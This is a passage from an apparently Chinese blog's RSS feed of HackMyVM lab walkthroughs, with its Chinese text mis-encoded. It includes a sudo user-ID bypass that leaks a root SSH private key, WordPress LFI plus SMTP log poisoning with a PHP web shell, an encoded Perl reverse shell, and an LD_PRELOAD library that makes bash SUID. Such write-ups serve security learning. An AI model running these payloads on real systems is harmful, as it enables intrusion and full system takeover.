            sY//////YSpcs  scpCY//Pp     | Welcome to Scapy
 ayp ayyyyyyySCP//Pp           syY//C    | Version 2.4.0
 AYAsAYYYYYYYY///Ps              cY//S   |
         pCCCCY//p          cSSps y//Y   | https://github.com/secdev/scapy
         SPPPP///a          pP///AC//Y   |
              A//A            cyP////C   | Have fun!
              p///Ac            sC///a   |
              P////YCpc           A//A   | Craft packets like I craft my beer.
       scccccp///pSP///p          p//Y   |               -- Jean De Clerck
      sY/////////y  caa           S//P   |
       cayCyayP//Ya              pY/Ya
        sY/PsY////YCc          aC//Yp
         sc  sccaCY//PCypaapyCP//YSs
                  spCPY//////YPSps
                       ccaacs

&gt;&gt;&gt; import os
&gt;&gt;&gt; os.system('/bin/bash')
sarah@choc:/home$ whoami
sarah

<br><br>sarah@choc:~$ cat quotes.txt

 â€œYou must have chaos within you to give birth to a dancing star.â€

 â€œIt is not a lack of love, but a lack of friendship that makes unhappy marriages.â€

 â€œThe multiplication of our kind borders on the obscene; the duty to love them, on the preposterous.â€

â€œWe do not die because we have to die; we die because one day, and not so long ago, our consciousness was forced to deem it necessary.â€œ

â€œLuke, I am your father"

sarah@choc:~$ cat user.txt
commenquaded

sarah@choc:~$ sudo -l
User sarah may run the following commands on choc:
    (ALL, !root) NOPASSWD: /usr/bin/wall

<br>!root è¡¨ç¤ºå‡ºäº†rootç”¨æˆ· å…¶ä»–ç”¨æˆ·éƒ½å¯ä»¥ç”¨ wall ä¸”ä¸è¾“å…¥å¯†ç <br><br><a rel="noopener nofollow" class="external-link" href="https://book.hacktricks.xyz/zh/linux-hardening/privilege-escalation#sudo-less-than-v1.28" target="_blank">https://book.hacktricks.xyz/zh/linux-hardening/privilege-escalation#sudo-less-than-v1.28</a><br>Cautionhacktircks è¿™é‡Œæ˜¯é”™è¯¯çš„ï¼Œæ­£ç¡®çš„ç‰ˆæœ¬åº”è¯¥æ˜¯ &lt;1.8.28<br>
<img alt="assets/Pasted image 20241222142725.png" src="https://www.c1trus.top/24-æ¸—é€/hmv/assets/pasted-image-20241222142725.png"><br>sarah@choc:/home/torki$ sudo -V
Sudo version 1.8.23
Sudoers policy plugin version 1.8.23
Sudoers file grammar version 46
Sudoers I/O plugin version 1.8.23
sarah@choc:/home/torki$ sudo -u#-1 wall --nobanner "/root/.ssh/id_rsa"
<br>wallå‘½ä»¤ ä¼šå‘ æ‰€æœ‰ç™»å½•çš„ç”¨æˆ· å¹¿æ’­æ¶ˆæ¯ï¼Œæ‰€ä»¥æˆ‘ä»¬éœ€è¦ç”¨å¦å¤–ä¸€ä¸ªç»ˆç«¯æ¥æ¥å—ç§é’¥<br>
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABFwAAAAdzc2gtcn
NhAAAAAwEAAQAAAQEAuSMhRxXhWoexxyZWPK4pkjyVHhT1jAmUYdEhKEFBLZh9z93ZW25M
lrj03xjFd4zP5AAHEG9p5h5SNi3ltHTtml7Nj59XlV6Heru/cwX7Yykxu75tZRxzQR4EjV
qUmxvqJgfql+XzKg3JgNwHRpG3tcW8Rdxbb3owVR97kjZP+3kA/pQGrQKdFe893Q1u2oDa
4R+v+jsYmzwjf/1M8m/S+J0hYzTOI+kQlBnZmMvpJYDidmyG1RO3dcLCpxCQpydH7GfO/s
6j0DdCvDr6+8C4eAzgDE5irjdMh2dKySNveNiMuhzsv1PS33ZWgx/ITlxu9zwiuufQm6D5
TcDYKMGCSQAAA8DHBCmTxwQpkwAAAAdzc2gtcnNhAAABAQC5IyFHFeFah7HHJlY8rimSPJ
UeFPWMCZRh0SEoQUEtmH3P3dlbbkyWuPTfGMV3jM/kAAcQb2nmHlI2LeW0dO2aXs2Pn1eV
Xod6u79zBftjKTG7vm1lHHNBHgSNWpSbG+omB+qX5fMqDcmA3AdGkbe1xbxF3FtvejBVH3
uSNk/7eQD+lAatAp0V7z3dDW7agNrhH6/6OxibPCN//Uzyb9L4nSFjNM4j6RCUGdmYy+kl
gOJ2bIbVE7d1wsKnEJCnJ0fsZ87+zqPQN0K8Ovr7wLh4DOAMTmKuN0yHZ0rJI2942Iy6HO
y/U9LfdlaDH8hOXG73PCK659CboPlNwNgowYJJAAAAAwEAAQAAAQAQK31QlBymp4tjdXm6
uwtudlQf2HzJylxnXriip3Bl5xe1/A5r6epOj8Dza1pz4pyVsVrsmI6LRsKvcLrLVBscjI
MvtB8WMLdshNFn3nHia0qoty0e06lNWq3TGsI3+ewtfiuDMNZYKfQbiRwpkbiV67tR7rkd
t3JZPPKyBoRd1kGjnPzJc2DPyaAtJtS21w86ZxJZtaMWUL6SE1+80VWv0XXPtlmAipfdgF
76A/Z4izCNolx0s+Ptus8gqaxJDeGI4xX5aZZ33kc5cSvNjI2hH6kFX39sS7beVz/zYDKA
BkJ0fZpNQ+HZfqGvT93YHAFZVpdlv7ysn16oNkOwZuZxAAAAgQCs/OtmKQ2SXR0ZrVryDk
58HSK2xCRcMaOqNamWSm+JaKEusms25bCD3liQGbazJyy6eS7iR2DOQPYwdU94dak72X+W
xwOexz8pwHGflvrA7SlKW4pXshuccpxgdC/KkqZRQyQvy7NbDTyGM+3uTQSnABmZWl8mJa
NtfY+fCEoKDgAAAIEA5urQzWNxzvBa4krknAuUMRD8TcsL4NjE6QCj9D1KJh2vGiBqNYjH
f6hZ+4LPFlaWiusjxZAF6vIaZJU0UHRzdcITqm1L20CZQr2D3tgWS6+VAGQHb1me5uoC4J
6Px6A7preSEjS2GtECqWxZevl8YqWEJtWaO1WDK61+Mr266UsAAACBAM0/S7QUbRqSmNTq
wd/4y9U4JxtOfeV4O0I+JNlTPkA2vdUeHEwWkKRqk3re72JwYlUAsD4AhXO1oEdfpO32fx
wavKtBNMpI64CiNVrPY8w9DPoWdCzxtFeRq1V50i9wdiVlHIdn0Ac+6T9Wv/0v8J7GXIkH
gskjOtELMuhigHo7AAAACXJvb3RAY2hvYwE=
-----END OPENSSH PRIVATE KEY-----

<br>sshè¿æ¥é‚£flag<br>root@choc:~# cat r00t.txt
inesbywal
]]></description><link>https://www.c1trus.top/24-æ¸—é€/hmv/45.choc.html</link><guid isPermaLink="false">24-æ¸—é€/HMV/45.choc.md</guid><dc:creator><![CDATA[C1trus]]></dc:creator><pubDate>Thu, 26 Dec 2024 08:41:17 GMT</pubDate><enclosure url="https://www.c1trus.top/24-æ¸—é€/hmv/assets/pasted-image-20241222142725.png" length="0" type="image/png"/><content:encoded>&lt;figure&gt;&lt;img src="https://www.c1trus.top/24-æ¸—é€/hmv/assets/pasted-image-20241222142725.png"&gt;&lt;/figure&gt;</content:encoded></item><item><title><![CDATA[44. Diophante]]></title><description><![CDATA[ 
 <br><br>
<br><a data-tooltip-position="top" aria-label="1. åŸºæœ¬ä¿¡æ¯^toc" data-href="#1. åŸºæœ¬ä¿¡æ¯^toc" href="https://www.c1trus.top/about:blank#1._åŸºæœ¬ä¿¡æ¯^toc" class="internal-link" target="_self" rel="noopener nofollow">1. åŸºæœ¬ä¿¡æ¯</a>
<br><a data-tooltip-position="top" aria-label="2. ä¿¡æ¯æ”¶é›†" data-href="#2. ä¿¡æ¯æ”¶é›†" href="https://www.c1trus.top/about:blank#2._ä¿¡æ¯æ”¶é›†" class="internal-link" target="_self" rel="noopener nofollow">2. ä¿¡æ¯æ”¶é›†</a>

<br><a data-tooltip-position="top" aria-label="2.1. ç«¯å£æ‰«æ" data-href="#2.1. ç«¯å£æ‰«æ" href="https://www.c1trus.top/about:blank#2.1._ç«¯å£æ‰«æ" class="internal-link" target="_self" rel="noopener nofollow">2.1. ç«¯å£æ‰«æ</a>
<br><a data-tooltip-position="top" aria-label="2.2. ç›®å½•æ‰«æ" data-href="#2.2. ç›®å½•æ‰«æ" href="https://www.c1trus.top/about:blank#2.2._ç›®å½•æ‰«æ" class="internal-link" target="_self" rel="noopener nofollow">2.2. ç›®å½•æ‰«æ</a>
<br><a data-tooltip-position="top" aria-label="2.3. knock" data-href="#2.3. knock" href="https://www.c1trus.top/about:blank#2.3._knock" class="internal-link" target="_self" rel="noopener nofollow">2.3. knock</a>


<br><a data-tooltip-position="top" aria-label="3. WordPressåˆ©ç”¨" data-href="#3. WordPressåˆ©ç”¨" href="https://www.c1trus.top/about:blank#3._WordPressåˆ©ç”¨" class="internal-link" target="_self" rel="noopener nofollow">3. WordPressåˆ©ç”¨</a>

<br><a data-tooltip-position="top" aria-label="3.1. wpscanæ‰«æ" data-href="#3.1. wpscanæ‰«æ" href="https://www.c1trus.top/about:blank#3.1._wpscanæ‰«æ" class="internal-link" target="_self" rel="noopener nofollow">3.1. wpscanæ‰«æ</a>
<br><a data-tooltip-position="top" aria-label="3.2. smtpä¸Šä¼ åé—¨" data-href="#3.2. smtpä¸Šä¼ åé—¨" href="https://www.c1trus.top/about:blank#3.2._smtpä¸Šä¼ åé—¨" class="internal-link" target="_self" rel="noopener nofollow">3.2. smtpä¸Šä¼ åé—¨</a>


<br><a data-tooltip-position="top" aria-label="4. ææƒ" data-href="#4. ææƒ" href="https://www.c1trus.top/about:blank#4._ææƒ" class="internal-link" target="_self" rel="noopener nofollow">4. ææƒ</a><br>
- <a data-tooltip-position="top" aria-label="4.1. ææƒleonardç”¨æˆ·" data-href="#4.1. ææƒleonardç”¨æˆ·" href="https://www.c1trus.top/about:blank#4.1._ææƒleonardç”¨æˆ·" class="internal-link" target="_self" rel="noopener nofollow">4.1. ææƒleonardç”¨æˆ·</a><br>
- <a data-tooltip-position="top" aria-label="4.2. LDåŠ«æŒææƒroot" data-href="#4.2. LDåŠ«æŒææƒroot" href="https://www.c1trus.top/about:blank#4.2._LDåŠ«æŒææƒroot" class="internal-link" target="_self" rel="noopener nofollow">4.2. LDåŠ«æŒææƒroot</a><br>
é¶æœºé“¾æ¥ <a rel="noopener nofollow" class="external-link" href="https://hackmyvm.eu/machines/machine.php?vm=Diophante" target="_blank">https://hackmyvm.eu/machines/machine.php?vm=Diophante</a><br>
ä½œè€… <a data-tooltip-position="top" aria-label="https://hackmyvm.eu/profile/?user=cromiphi" rel="noopener nofollow" class="external-link" href="https://hackmyvm.eu/profile/?user=cromiphi" target="_blank">cromiphi</a><br>
éš¾åº¦ â­ï¸â­ï¸â­ï¸â­ï¸â­ï¸
<br><br><br>â”Œâ”€â”€(rootã‰¿kali)-[~]
â””â”€# nmap 192.168.56.13 -p-
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-12-21 05:01 EST
Nmap scan report for 192.168.56.13
Host is up (0.0031s latency).
Not shown: 65532 closed tcp ports (reset)
PORT   STATE    SERVICE
22/tcp open     ssh
25/tcp filtered smtp
80/tcp open     http
MAC Address: 08:00:27:B8:67:CA (Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 28.73 seconds

<br>25 ç«¯å£è¢«é˜²ç«å¢™è¿‡æ»¤äº† å¤šåŠæ˜¯éœ€è¦knock<br><br>â”Œâ”€â”€(rootã‰¿kali)-[~]
â””â”€# dirsearch -u http://192.168.56.13
^[[A/usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html
  from pkg_resources import DistributionNotFound, VersionConflict

  _|. _ _  _  _  _ _|_    v0.4.3
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460

Output File: /root/reports/http_192.168.56.13/_24-12-21_05-06-58.txt

Target: http://192.168.56.13/

[05:06:58] Starting:
[05:06:59] 403 -  278B  - /.ht_wsr.txt
[05:06:59] 403 -  278B  - /.htaccess.orig
[05:06:59] 403 -  278B  - /.htaccess.bak1
[05:06:59] 403 -  278B  - /.htaccess.save
[05:06:59] 403 -  278B  - /.htaccess.sample
[05:06:59] 403 -  278B  - /.htaccess_extra
[05:06:59] 403 -  278B  - /.htaccess_orig
[05:06:59] 403 -  278B  - /.htaccess_sc
[05:06:59] 403 -  278B  - /.htaccessOLD
[05:06:59] 403 -  278B  - /.htaccessBAK
[05:06:59] 403 -  278B  - /.htaccessOLD2
[05:06:59] 403 -  278B  - /.htm
[05:06:59] 403 -  278B  - /.htpasswd_test
[05:06:59] 403 -  278B  - /.html
[05:06:59] 403 -  278B  - /.htpasswds
[05:06:59] 403 -  278B  - /.httr-oauth
[05:06:59] 403 -  278B  - /.php
[05:07:05] 301 -  313B  - /blog  -&gt;  http://192.168.56.13/blog/
[05:07:09] 200 -    3KB - /blog/wp-login.php
[05:07:09] 200 -    5KB - /blog/
[05:07:15] 403 -  278B  - /server-status
[05:07:15] 403 -  278B  - /server-status/

Task Completed

â”Œâ”€â”€(rootã‰¿kali)-[~/Desktop/hmv/Diophanate]
â””â”€# gobuster dir -u http://192.168.56.13 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,txt,zip
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.56.13
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              zip,php,html,txt
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.html                (Status: 403) [Size: 278]
/.php                 (Status: 403) [Size: 278]
/index.html           (Status: 200) [Size: 10701]
/blog                 (Status: 301) [Size: 313] [--&gt; http://192.168.56.13/blog/]
/note.txt             (Status: 200) [Size: 36]

<br><br>/note.txt<br>â”Œâ”€â”€(rootã‰¿kali)-[~/Desktop/hmv/Diophanate]
â””â”€# curl http://192.168.56.13/note.txt
Don't forget: 7000 8000 9000

admin
<br>è¿™åº”è¯¥å°±æ˜¯è¦æ•²é—¨çš„ç«¯å£<br>
â”Œâ”€â”€(rootã‰¿kali)-[~/Desktop/hmv/Diophanate]
â””â”€# knock 192.168.56.13 7000 8000 9000 -v
hitting tcp 192.168.56.13:7000
hitting tcp 192.168.56.13:8000
hitting tcp 192.168.56.13:9000

â”Œâ”€â”€(rootã‰¿kali)-[~/Desktop/hmv/Diophanate]
â””â”€# nmap 192.168.56.13
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-12-21 05:18 EST
Nmap scan report for 192.168.56.13
Host is up (0.022s latency).
Not shown: 997 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
25/tcp open  smtp
80/tcp open  http
MAC Address: 08:00:27:B8:67:CA (Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 1.90 seconds

<br><br>å‘ç°å­˜åœ¨wp-login è·¯å¾„ å¤šåŠå­˜åœ¨ WordPress æœåŠ¡<br><img alt="wg0pmbjq28a" src="https://www.c1trus.top/24-æ¸—é€/hmv/assets/a7u4tewdaek.png"><br>æŸ¥çœ‹æºç å¯ä»¥å‘ç°ä¸€ä¸ªåŸŸå hard<img alt="7lzau0bx3eu" src="https://www.c1trus.top/24-æ¸—é€/hmv/assets/4ffjhly5t19.png"><br>
æ·»åŠ ä¸€ä¸‹<br><br>â”Œâ”€â”€(rootã‰¿kali)-[~]
â””â”€# wpscan --url http://hard/blog --api-token xxxxxx
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ Â®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | ''_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.27
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[+] URL: http://hard/blog/ [192.168.56.13]
[+] Started: Sat Dec 21 05:26:22 2024

Interesting Finding(s):

[+] Headers
 | Interesting Entry: Server: Apache/2.4.38 (Debian)
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] XML-RPC seems to be enabled: http://hard/blog/xmlrpc.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/

[+] WordPress readme found: http://hard/blog/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] Upload directory has listing enabled: http://hard/blog/wp-content/uploads/
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] The external WP-Cron seems to be enabled: http://hard/blog/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 5.7 identified (Insecure, released on 2021-03-09).
 | Found By: Rss Generator (Passive Detection)
 |  - http://hard/blog/?feed=rss2, &lt;generator&gt;https://wordpress.org/?v=5.7&lt;/generator&gt;
 |  - http://hard/blog/?feed=comments-rss2, &lt;generator&gt;https://wordpress.org/?v=5.7&lt;/generator&gt;
 |
 | [!] 44 vulnerabilities identified:

[+] site-editor
 | Location: http://hard/blog/wp-content/plugins/site-editor/
 | Latest Version: 1.1.1 (up to date)
 | Last Updated: 2017-05-02T23:34:00.000Z
 |
 | Found By: Urls In Homepage (Passive Detection)
 |
 | [!] 1 vulnerability identified:
 |
 | [!] Title: Site Editor &lt;= 1.1.1 - Local File Inclusion (LFI)
 |     References:
 |      - https://wpscan.com/vulnerability/4432ecea-2b01-4d5c-9557-352042a57e44
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-7422
 |      - https://seclists.org/fulldisclosure/2018/Mar/40
 |      - https://github.com/SiteEditor/editor/issues/2
 |
 | Version: 1.1.1 (80% confidence)
 | Found By: Readme - Stable Tag (Aggressive Detection)
 |  - http://hard/blog/wp-content/plugins/site-editor/readme.txt

<br>é‡Œé¢å¯ä»¥æ£€æµ‹åˆ°site-editorå­˜åœ¨æ’ä»¶å­˜åœ¨ä¸€ä¸ªLFI<br>
ç„¶åå¯ä»¥æ‰¾åˆ°è¿™ä¸ªCVEçš„åˆ©ç”¨<br>
<a rel="noopener nofollow" class="external-link" href="https://www.exploit-db.com/exploits/44340" target="_blank">https://www.exploit-db.com/exploits/44340</a><br>
éªŒè¯ä¸€ä¸‹å‘ç°å­˜åœ¨å¯ä»¥åˆ©ç”¨<br>http://192.168.56.13/blog/wp-content/plugins/site-editor/editor/extensions/pagebuilder/includes/ajax_shortcode_pattern.php?ajax_path=/etc/passwd
<br><img alt="rpo1ftx3bek" src="https://www.c1trus.top/24-æ¸—é€/hmv/assets/rrborcsuye.png"><br><br>æˆ‘ä»¬è·å–åˆ°äº†ä¸€ä¸ªLFI<br>
ä½†æ˜¯ç°åœ¨éœ€è¦åˆ©ç”¨è¿™ä¸ªå¼¹ä¸€ä¸ªshell<br>è¿™é‡Œæˆ‘æƒ³åˆ°äº†æˆ‘ä»¬ç«¯å£æ‰«ææ—¶ å¼€æ”¾çš„25ç«¯å£ SMTPé‚®ä»¶æœåŠ¡<br>
æˆ‘ä»¬åˆ©ç”¨SMTPé‚®ä»¶æœåŠ¡ å‘é€ä¸€ä¸ªåé—¨é‚®ä»¶ ç„¶åå¯¹å…¶è¿›è¡Œæ–‡ä»¶åŒ…å«<br>
è¿™é‡Œéœ€è¦é€‰æ‹©ä¸€ä¸ªæ¥å—é‚®ä»¶çš„ç”¨æˆ·ï¼Œç”¨æˆ·å¯ä»¥åœ¨/etc/passwdé‡Œé¢è·å–
<br>apt install postfix


â”Œâ”€â”€(rootã‰¿kali)-[~/Desktop/hmv/Diophanate]
â””â”€# nc 192.168.56.14 25
220 debian ESMTP Postfix (Debian/GNU)
helo xxx
250 debian
mail from:&lt;kali&gt;
250 2.1.0 Ok
rcpt to: sabine
250 2.1.5 Ok
data
354 End data with &lt;CR&gt;&lt;LF&gt;.&lt;CR&gt;&lt;LF&gt;
&lt;?php system($_GET['cmd']);?&gt;
.
250 2.0.0 Ok: queued as B952B802CC
quit
221 2.0.0 Bye


<br>Warning
é‚®ä»¶å‘é€è¿‡å¤šä¼šå¯¼è‡´logæ–‡ä»¶æŸåï¼Œéœ€è¦é‡ç½®é¶æœºæ‰è¡Œ<br>
rcpt to: sabine åé¢çš„æ¥å—è€…æ˜¯å›ºå®šçš„ ä¸èƒ½ä»»æ„ï¼Œå¿…é¡»æ˜¯ç›®æ ‡é¶æœºä¸Šçš„ç”¨æˆ·<br>
mail from:&lt;kali&gt; è¿™é‡Œåé¢çš„å‘é€è€…å¯ä»¥ä»»æ„ï¼Œä½†ä¸€å®šè¦ç”¨&lt; &gt;æ‹¬èµ·æ¥
<br>æˆ‘ä»¬ä½¿ç”¨ Postfix å‘é€é‚®ä»¶ï¼šé‚®ä»¶é€šå¸¸å­˜å‚¨åœ¨ /var/spool/mail/&lt;ç”¨æˆ·å&gt; æˆ– /var/mail/&lt;ç”¨æˆ·å&gt; ä¸­ã€‚<br>ç„¶åè®¿é—®<br>
<a rel="noopener nofollow" class="external-link" href="http://192.168.56.14/blog/wp-content/plugins/site-editor/editor/extensions/pagebuilder/includes/ajax_shortcode_pattern.php?ajax_path=/var/mail/sabine&amp;cmd=id" target="_blank">http://192.168.56.14/blog/wp-content/plugins/site-editor/editor/extensions/pagebuilder/includes/ajax_shortcode_pattern.php?ajax_path=/var/mail/sabine&amp;cmd=id</a><br>
å³å¯RCE<br>å¼¹shell<br>curl http://192.168.56.14/blog/wp-content/plugins/site-editor/editor/extensions/pagebuilder/includes/ajax_shortcode_pattern.php?ajax_path=/var/mail/sabine&amp;cmd=perl%20-e%20%27use%20Socket%3B%24i%3D%22192.168.56.6%22%3B%24p%3D1234%3Bsocket%28S%2CPF_INET%2CSOCK_STREAM%2Cgetprotobyname%28%22tcp%22%29%29%3Bif%28connect%28S%2Csockaddr_in%28%24p%2Cinet_aton%28%24i%29%29%29%29%7Bopen%28STDIN%2C%22%3E%26S%22%29%3Bopen%28STDOUT%2C%22%3E%26S%22%29%3Bopen%28STDERR%2C%22%3E%26S%22%29%3Bexec%28%22%2Fbin%2Fbash%20-i%22%29%3B%7D%3B%27


â”Œâ”€â”€(rootã‰¿kali)-[~/Desktop/hmv/Diophanate]
â””â”€# pwncat-cs -lp 1234

[08:40:32] Welcome to pwncat ğŸˆ!                                                        __main__.py:164
[08:40:59] received connection from 192.168.56.14:42498                                      bind.py:84
[08:41:00] 192.168.56.14:42498: registered new host w/ db                                manager.py:957
(local) pwncat$
(remote) www-data@diophante:/var/www/html/blog/wp-content/plugins/site-editor/editor/extensions/pagebui
lder/includes$

<br><br><br>æ£€æµ‹å‘ç°æœ‰ doas çš„SUIDæƒé™<br>
æˆ‘ä»¬çœ‹çœ‹doasçš„é…ç½®æ–‡ä»¶<br>(remote) www-data@diophante:/home/leonard$ cat /etc/doas.conf
permit nopass www-data as sabine cmd /usr/bin/setsid
permit nopass sabine as leonard cmd /usr/bin/mutt
<br>å…è®¸æˆ‘ä»¬ä»¥ www-data ç”¨æˆ· ç”¨ sabine ç”¨æˆ·çš„æƒé™æ‰§è¡Œ /usr/bin/setsid<br>
å…è®¸æˆ‘ä»¬ä»¥ sabine ç”¨æˆ· ç”¨ leonard ç”¨æˆ·çš„æƒé™æ‰§è¡Œ /usr/bin/mutt<br>å…ˆåˆ©ç”¨ /usr/bin/setsid æå–åˆ° sabine ç”¨æˆ·<br>(remote) www-data@diophante:/home/leonard$ doas -u sabine /usr/bin/setsid bash
bash: cannot set terminal process group (-1): Inappropriate ioctl for device
bash: no job control in this shell
sabine@diophante:/home/leonard$ whoami
sabine

<br>ç„¶åææƒåˆ° leonard ç”¨æˆ·<br>sabine@diophante:/home/leonard$ doas -u leonard /usr/bin/mutt
è¾“å…¥ï¼å›è½¦
leonard@diophante:~$ whoami
leonard

leonard@diophante:~$ cat user.txt
Thonirburarnlog

<br><br>leonard@diophante:~$ sudo -l
Matching Defaults entries for leonard on diophante:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, env_keep+=LD_PRELOAD

User leonard may run the following commands on diophante:
    (ALL : ALL) NOPASSWD: /usr/bin/ping

<br>å‘ç°æˆ‘ä»¬å½“å‰ç”¨æˆ·å¯ä»¥æ‰§è¡Œ/usr/bin/ping<br>
å…¶ä¸­ env_keep+=LD_PRELOAD è¿è¡Œæˆ‘ä»¬è¿›è¡ŒLDåŠ«æŒ<br>å½“æˆ‘ä»¬ä½¿ç”¨ Ping å‘½ä»¤æ—¶ï¼Œå°±ä¼šè°ƒç”¨å¾ˆå¤šåŠ¨æ€é“¾æ¥åº“æ–‡ä»¶ï¼ˆ.soæ–‡ä»¶ï¼‰é‡Œé¢çš„å‡½æ•°ï¼Œè€Œ LD_PRELOAD è¿™ä¸ªç¯å¢ƒå˜é‡å…è®¸æˆ‘ä»¬æŒ‡å®šä¼˜å…ˆè°ƒç”¨çš„åŠ¨æ€é“¾æ¥åº“æ–‡ä»¶ã€‚<br>
æ‰€ä»¥æˆ‘ä»¬å¯ä»¥å†™ä¸€ä¸ªæ¶æ„çš„soæ–‡ä»¶ï¼Œæ›¿æ¢é‡Œé¢è¢«è°ƒç”¨å‡½æ•°çš„åŠŸèƒ½ï¼Œç„¶åè®©å…¶ ping ä»¥rootç”¨æˆ·è¿è¡Œè¿™ä¸ªå‡½æ•° å®ç°ææƒ<br>é¦–å…ˆæˆ‘ä»¬éœ€è¦è·å–åˆ°ä¸€ä¸ª ping å‘½ä»¤æ—¶ä¸€å®šä¼šæ‰§è¡Œå‡½æ•°
idaåç¼–è¯‘ ping
è¿™é‡Œæˆ‘é€‰æ‹© getopt å‡½æ•°ã€‚å› ä¸ºä»–çš„ä½œç”¨æ˜¯è·å–å‚æ•°ã€‚æ‰€ä»¥åŸºæœ¬ä¸Šä¸€å®šä¼šè¢«è°ƒç”¨<br><img alt="48as789f2nw" src="https://www.c1trus.top/24-æ¸—é€/hmv/assets/fvn9koz8vu6.png"><br>ç¼–è¯‘æ¶æ„soæ–‡ä»¶<br>int getopt(char *s){
	setuid(0);
	setgid(0);
	system("chmod +s /bin/bash");
}

gcc a.c  -o pwn.so -shared
<br>
è¿™é‡Œæˆ‘ç”¨Kali2024çš„ç¼–è¯‘ä¸è¡Œ<br>
ä¼šæŠ¥é”™<br>
<img alt="3unullx7pde" src="https://www.c1trus.top/24-æ¸—é€/hmv/assets/ht1kx2925cl.png">
<br>å¯ä»¥æ¢ä¸€ä¸ªç‰ˆæœ¬ ã€‚åº”è¯¥æ˜¯gccç‰ˆæœ¬çš„é—®é¢˜ã€‚<br><img alt="2nxzmfir7ua" src="https://www.c1trus.top/24-æ¸—é€/hmv/assets/58mq0y0jcua.png"><br>ç„¶åæŠŠç¼–è¯‘åçš„ pwn.so ä¼ ä¸Šå»å°±è¡Œäº†<br>sudo -u root LD_PRELOAD=/tmp/pwn.so /usr/bin/ping 1.1.1.1

des$ ls -la /bin/bash
-rwsr-sr-x 1 root root 1168776 Apr 18  2019 /bin/bash
leonard@diophante:/var/www/html/blog/wp-content/plugins/site-editor/editor/extensions/pagebuilder/inclu
des$ bash -p

bash-5.0# whoami
root
bash-5.0# ls /root
root.txt
bash-5.0# cat /root/root.txt
Culcelborlus

]]></description><link>https://www.c1trus.top/24-æ¸—é€/hmv/44.-diophante.html</link><guid isPermaLink="false">24-æ¸—é€/HMV/44. Diophante.md</guid><dc:creator><![CDATA[C1trus]]></dc:creator><pubDate>Thu, 26 Dec 2024 06:21:46 GMT</pubDate><enclosure url="https://www.c1trus.top/24-æ¸—é€/hmv/assets/a7u4tewdaek.png" length="0" type="image/png"/><content:encoded>&lt;figure&gt;&lt;img src="https://www.c1trus.top/24-æ¸—é€/hmv/assets/a7u4tewdaek.png"&gt;&lt;/figure&gt;</content:encoded></item><item><title><![CDATA[43.p4l4nc4]]></title><description><![CDATA[ 
 <br><br>
<br><a data-tooltip-position="top" aria-label="1. åŸºæœ¬ä¿¡æ¯^toc" data-href="#1. åŸºæœ¬ä¿¡æ¯^toc" href="https://www.c1trus.top/about:blank#1._åŸºæœ¬ä¿¡æ¯^toc" class="internal-link" target="_self" rel="noopener nofollow">1. åŸºæœ¬ä¿¡æ¯</a>
<br><a data-tooltip-position="top" aria-label="2. ä¿¡æ¯æ”¶é›†" data-href="#2. ä¿¡æ¯æ”¶é›†" href="https://www.c1trus.top/about:blank#2._ä¿¡æ¯æ”¶é›†" class="internal-link" target="_self" rel="noopener nofollow">2. ä¿¡æ¯æ”¶é›†</a>

<br><a data-tooltip-position="top" aria-label="2.1. ç«¯å£æ‰«æ" data-href="#2.1. ç«¯å£æ‰«æ" href="https://www.c1trus.top/about:blank#2.1._ç«¯å£æ‰«æ" class="internal-link" target="_self" rel="noopener nofollow">2.1. ç«¯å£æ‰«æ</a>
<br><a data-tooltip-position="top" aria-label="2.2. ç›®å½•æ‰«æ" data-href="#2.2. ç›®å½•æ‰«æ" href="https://www.c1trus.top/about:blank#2.2._ç›®å½•æ‰«æ" class="internal-link" target="_self" rel="noopener nofollow">2.2. ç›®å½•æ‰«æ</a>


